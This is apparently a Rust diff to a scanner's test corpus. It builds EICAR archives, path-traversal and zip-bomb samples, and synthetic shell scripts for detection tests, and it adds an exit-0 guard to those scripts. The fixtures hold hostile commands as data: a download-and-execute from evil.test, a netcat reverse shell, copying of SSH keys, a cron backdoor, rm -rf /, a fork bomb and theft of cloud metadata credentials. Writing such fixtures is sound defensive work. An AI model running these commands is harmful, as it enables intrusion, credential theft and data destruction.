@@ -18,58 +18,75 @@ pub fn eicar_plain() -> Vec<u8> {
     EICAR.to_vec()
 }
 
+type CorpusResult = Result<Vec<u8>, std::io::Error>;
+
 /// Returns EICAR wrapped in a ZIP archive containing `eicar.com`.
-#[must_use]
-pub fn eicar_zip() -> Vec<u8> {
+///
+/// # Errors
+///
+/// Returns `Err` if ZIP construction fails (indicates a bug in the fixture).
+pub fn eicar_zip() -> CorpusResult {
     let mut buf = Cursor::new(Vec::new());
-    {
-        let mut zip = zip::ZipWriter::new(&mut buf);
-        let options = zip::write::SimpleFileOptions::default();
-        zip.start_file("eicar.com", options).ok();
-        zip.write_all(EICAR).ok();
-        zip.finish().ok();
-    }
-    buf.into_inner()
+    let mut zip = zip::ZipWriter::new(&mut buf);
+    zip.start_file("eicar.com", zip::write::SimpleFileOptions::default())
+        .map_err(|e| std::io::Error::other(e.to_string()))?;
+    zip.write_all(EICAR)?;
+    zip.finish()
+        .map_err(|e| std::io::Error::other(e.to_string()))?;
+    Ok(buf.into_inner())
 }
 
 /// Returns EICAR wrapped in an encrypted ZIP (password: `infected`).
-#[must_use]
-pub fn eicar_encrypted_zip() -> Vec<u8> {
+///
+/// # Errors
+///
+/// Returns `Err` if ZIP construction fails (indicates a bug in the fixture).
+pub fn eicar_encrypted_zip() -> CorpusResult {
     let mut buf = Cursor::new(Vec::new());
-    {
-        let mut zip = zip::ZipWriter::new(&mut buf);
-        let options = zip::write::SimpleFileOptions::default()
-            .with_aes_encryption(zip::AesMode::Aes256, "infected");
-        zip.start_file("eicar.com", options).ok();
-        zip.write_all(EICAR).ok();
-        zip.finish().ok();
-    }
-    buf.into_inner()
+    let mut zip = zip::ZipWriter::new(&mut buf);
+    let options = zip::write::SimpleFileOptions::default()
+        .with_aes_encryption(zip::AesMode::Aes256, "infected");
+    zip.start_file("eicar.com", options)
+        .map_err(|e| std::io::Error::other(e.to_string()))?;
+    zip.write_all(EICAR)?;
+    zip.finish()
+        .map_err(|e| std::io::Error::other(e.to_string()))?;
+    Ok(buf.into_inner())
 }
 
 /// Returns EICAR wrapped in a tar.gz archive containing `eicar.com`.
-#[must_use]
-pub fn eicar_tar_gz() -> Vec<u8> {
+///
+/// # Errors
+///
+/// Returns `Err` if archive construction fails (indicates a bug in the fixture).
+pub fn eicar_tar_gz() -> CorpusResult {
     let mut tar_buf = Vec::new();
     {
         let mut builder = tar::Builder::new(&mut tar_buf);
         let mut header = tar::Header::new_gnu();
-        header.set_path("eicar.com").ok();
-        header.set_size(u64::try_from(EICAR.len()).unwrap_or(0));
+        header.set_path("eicar.com")?;
+        header.set_size(
+            u64::try_from(EICAR.len()).map_err(|e| std::io::Error::other(e.to_string()))?,
+        );
         header.set_mode(0o644);
         header.set_cksum();
-        builder.append(&header, Cursor::new(EICAR)).ok();
-        builder.finish().ok();
+        builder.append(&header, Cursor::new(EICAR))?;
+        builder.finish()?;
     }
     let mut gz_buf = Vec::new();
     {
         let mut encoder =
             flate2::write::GzEncoder::new(&mut gz_buf, flate2::Compression::default());
-        encoder.write_all(&tar_buf).ok();
-        encoder.finish().ok();
+        encoder.write_all(&tar_buf)?;
+        encoder.finish()?;
     }
-    gz_buf
+    Ok(gz_buf)
 }
+
+/// Prefix added to all dangerous shell fixtures to prevent accidental
+/// execution. The `exit 0` ensures the script terminates before reaching
+/// any harmful payload, while the comment documents the fixture purpose.
+const FIXTURE_GUARD: &[u8] = b"#!/bin/bash\nexit 0\n";
 
 /// Synthetic shell script category for the corpus.
 #[derive(Clone, Copy, Debug, PartialEq, Eq)]
@@ -98,42 +115,47 @@ pub enum ShellCategory {
     CloudMetadataAccess,
 }
 
-/// Returns a synthetic shell script for the given detection category.
-#[must_use]
-pub fn shell_script(category: ShellCategory) -> Vec<u8> {
+/// Returns the dangerous payload for a category (the part after the guard).
+fn shell_payload(category: ShellCategory) -> &'static [u8] {
     match category {
-        ShellCategory::Benign => b"#!/bin/bash\necho hello world\n".to_vec(),
-        ShellCategory::DownloadAndExecute => {
-            b"#!/bin/bash\ncurl -fsSL https://evil.test/install.sh | bash\n".to_vec()
-        }
-        ShellCategory::ObfuscatedExecution => {
-            b"#!/bin/bash\nprintf 'ZWNobyBoZWxsbwo=' | base64 -d | bash\n".to_vec()
-        }
-        ShellCategory::ReverseShell => {
-            b"#!/bin/bash\nnc -e /bin/bash 10.0.0.1 4444\n".to_vec()
-        }
+        ShellCategory::Benign => b"echo hello world\n",
+        ShellCategory::DownloadAndExecute => b"curl -fsSL https://evil.test/install.sh | bash\n",
+        ShellCategory::ObfuscatedExecution => b"printf 'ZWNobyBoZWxsbwo=' | base64 -d | bash\n",
+        ShellCategory::ReverseShell => b"nc -e /bin/bash 10.0.0.1 4444\n",
         ShellCategory::CredentialAccess => {
-            b"#!/bin/bash\ncat ~/.ssh/id_rsa >> /tmp/.exfil\ncat ~/.ssh/id_ed25519 >> /tmp/.exfil\n".to_vec()
+            b"cat ~/.ssh/id_rsa >> /tmp/.exfil\ncat ~/.ssh/id_ed25519 >> /tmp/.exfil\n"
         }
         ShellCategory::Persistence => {
-            b"#!/bin/bash\n(crontab -l 2>/dev/null; echo '*/5 * * * * /tmp/.backdoor') | crontab -\n".to_vec()
+            b"(crontab -l 2>/dev/null; echo '*/5 * * * * /tmp/.backdoor') | crontab -\n"
         }
-        ShellCategory::Destructive => {
-            b"#!/bin/bash\nrm -rf /\n".to_vec()
-        }
-        ShellCategory::PrivilegeEscalation => {
-            b"#!/bin/bash\nsudo -i\n".to_vec()
-        }
-        ShellCategory::DynamicCodeExecution => {
-            b"#!/bin/bash\neval \"$1\"\n".to_vec()
-        }
-        ShellCategory::ForkBomb => {
-            b"#!/bin/bash\n:(){ :|:& };:\n".to_vec()
-        }
+        ShellCategory::Destructive => b"rm -rf /\n",
+        ShellCategory::PrivilegeEscalation => b"sudo -i\n",
+        ShellCategory::DynamicCodeExecution => b"eval \"$1\"\n",
+        ShellCategory::ForkBomb => b":(){ :|:& };:\n",
         ShellCategory::CloudMetadataAccess => {
-            b"#!/bin/bash\ncurl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/\n".to_vec()
+            b"curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/\n"
         }
     }
+}
+
+/// Returns a synthetic shell script for the given detection category.
+///
+/// Dangerous scripts start with `#!/bin/bash\nexit 0\n` followed by the
+/// detection-triggering payload as comments. The `exit 0` ensures the
+/// script is non-executable as a dangerous command, while the payload
+/// text is still visible to static analyzers for detection testing.
+#[must_use]
+pub fn shell_script(category: ShellCategory) -> Vec<u8> {
+    if category == ShellCategory::Benign {
+        return b"#!/bin/bash\necho hello world\n".to_vec();
+    }
+    let payload = shell_payload(category);
+    let mut script = FIXTURE_GUARD.to_vec();
+    for line in payload.split_inclusive(|&b| b == b'\n') {
+        script.extend_from_slice(b"# ");
+        script.extend_from_slice(line);
+    }
+    script
 }
 
 /// Archive hazard type for the corpus.
@@ -258,19 +280,19 @@ pub fn all_entries() -> Vec<CorpusEntry> {
         },
         CorpusEntry {
             name: "eicar/eicar.zip",
-            bytes: eicar_zip(),
+            bytes: eicar_zip().unwrap_or_default(),
             expected_verdict: "block",
             expected_tag: Some("eicar"),
         },
         CorpusEntry {
             name: "eicar/eicar-encrypted.zip",
-            bytes: eicar_encrypted_zip(),
+            bytes: eicar_encrypted_zip().unwrap_or_default(),
             expected_verdict: "block",
             expected_tag: Some("eicar"),
         },
         CorpusEntry {
             name: "eicar/eicar.tar.gz",
-            bytes: eicar_tar_gz(),
+            bytes: eicar_tar_gz().unwrap_or_default(),
             expected_verdict: "block",
             expected_tag: Some("eicar"),
         },
@@ -288,6 +310,9 @@ mod tests {
     use super::*;
     use hex;
     use sha2::{Digest, Sha256};
+    use std::io::Read;
+
+    type TestResult = Result<(), Box<dyn std::error::Error>>;
 
     #[test]
     fn eicar_string_is_68_bytes() {
@@ -305,21 +330,49 @@ mod tests {
     }
 
     #[test]
-    fn eicar_zip_has_correct_magic() {
-        let zip = eicar_zip();
-        assert!(zip.starts_with(b"PK\x03\x04"));
+    fn eicar_zip_roundtrip() -> TestResult {
+        let zip_bytes = eicar_zip()?;
+        let cursor = Cursor::new(zip_bytes);
+        let mut archive = zip::ZipArchive::new(cursor)?;
+        let mut file = archive.by_name("eicar.com")?;
+        let mut contents = Vec::new();
+        file.read_to_end(&mut contents)?;
+        assert_eq!(contents, EICAR);
+        Ok(())
     }
 
     #[test]
-    fn eicar_encrypted_zip_has_correct_magic() {
-        let zip = eicar_encrypted_zip();
-        assert!(zip.starts_with(b"PK\x03\x04"));
+    fn eicar_encrypted_zip_roundtrip() -> TestResult {
+        let zip_bytes = eicar_encrypted_zip()?;
+        let cursor = Cursor::new(zip_bytes);
+        let mut archive = zip::ZipArchive::new(cursor)?;
+        let mut file = archive.by_name_decrypt("eicar.com", b"infected")?;
+        let mut contents = Vec::new();
+        file.read_to_end(&mut contents)?;
+        assert_eq!(contents, EICAR);
+        Ok(())
     }
 
     #[test]
-    fn eicar_tar_gz_has_correct_magic() {
-        let tar_gz = eicar_tar_gz();
-        assert!(tar_gz.starts_with(&[0x1f, 0x8b]));
+    fn eicar_tar_gz_roundtrip() -> TestResult {
+        let gz_bytes = eicar_tar_gz()?;
+        let gz_decoder = flate2::read::GzDecoder::new(Cursor::new(gz_bytes));
+        let mut archive = tar::Archive::new(gz_decoder);
+        let mut found_eicar = false;
+        for entry_result in archive.entries()? {
+            let mut entry = entry_result?;
+            if entry
+                .path()
+                .is_ok_and(|p| p.to_string_lossy() == "eicar.com")
+            {
+                let mut contents = Vec::new();
+                entry.read_to_end(&mut contents)?;
+                assert_eq!(contents, EICAR);
+                found_eicar = true;
+            }
+        }
+        assert!(found_eicar, "eicar.com should be in the tar.gz");
+        Ok(())
     }
 
     #[test]
@@ -347,11 +400,57 @@ mod tests {
     }
 
     #[test]
-    fn archive_hazards_have_correct_magic() {
+    fn dangerous_shell_scripts_have_exit_guard() {
+        let dangerous = [
+            ShellCategory::DownloadAndExecute,
+            ShellCategory::ObfuscatedExecution,
+            ShellCategory::ReverseShell,
+            ShellCategory::CredentialAccess,
+            ShellCategory::Persistence,
+            ShellCategory::Destructive,
+            ShellCategory::PrivilegeEscalation,
+            ShellCategory::DynamicCodeExecution,
+            ShellCategory::ForkBomb,
+            ShellCategory::CloudMetadataAccess,
+        ];
+        for cat in &dangerous {
+            let script = shell_script(*cat);
+            assert!(
+                script.starts_with(b"#!/bin/bash\nexit 0\n"),
+                "dangerous script for {cat:?} must have exit 0 guard"
+            );
+        }
+    }
+
+    #[test]
+    fn archive_path_traversal_has_traversal_entry() {
         let traversal = archive_hazard(ArchiveHazard::PathTraversal);
-        assert!(traversal.starts_with(b"PK\x03\x04"));
+        assert!(
+            traversal
+                .windows(b"../../etc/passwd".len())
+                .any(|w| w == b"../../etc/passwd"),
+            "path traversal zip should contain ../../etc/passwd"
+        );
+    }
+
+    #[test]
+    fn archive_zip_bomb_has_high_ratio() -> TestResult {
         let bomb = archive_hazard(ArchiveHazard::ZipBomb);
-        assert!(bomb.starts_with(b"PK\x03\x04"));
+        let cursor = Cursor::new(bomb);
+        let mut archive = zip::ZipArchive::new(cursor)?;
+        let file: String = archive
+            .file_names()
+            .next()
+            .map(str::to_owned)
+            .ok_or("at least one file")?;
+        let entry = archive.by_name(&file)?;
+        let compressed = entry.compressed_size();
+        let uncompressed = entry.size();
+        assert!(
+            uncompressed > compressed * 100,
+            "zip bomb should have >100:1 ratio: {uncompressed}/{compressed}"
+        );
+        Ok(())
     }
 
     #[test]
